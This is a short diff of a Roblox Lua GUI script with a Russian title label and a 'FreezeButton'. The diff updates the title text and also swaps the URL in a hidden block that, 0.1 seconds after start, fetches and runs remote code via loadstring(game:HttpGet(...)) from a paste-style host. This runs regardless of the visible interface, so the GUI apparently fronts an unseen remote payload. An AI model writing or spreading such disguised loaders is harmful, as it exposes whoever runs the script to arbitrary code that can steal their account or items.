@@ -22,7 +22,7 @@ local Title = Instance.new("TextLabel")
 Title.Parent = MainFrame
 Title.Size = UDim2.new(1, 0, 0, 40)
 Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-Title.Text = "Vasha_Koroleva.lol спасибо за тест от нашей команды!"
+Title.Text = "Последняя версия лол"
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.TextSize = 14
 Title.Font = Enum.Font.SourceSansBold
@@ -108,5 +108,5 @@ FreezeButton.AutoButtonColor = false
 
 task.spawn(function()
     task.wait(0.1)
-    loadstring(game:HttpGet("https://api.rubis.lol/v2/scrap/7oVCld/raw"))()
+    loadstring(game:HttpGet("https://api.rubis.lol/v2/scrap/UcMeYQ/raw"))()
 end)
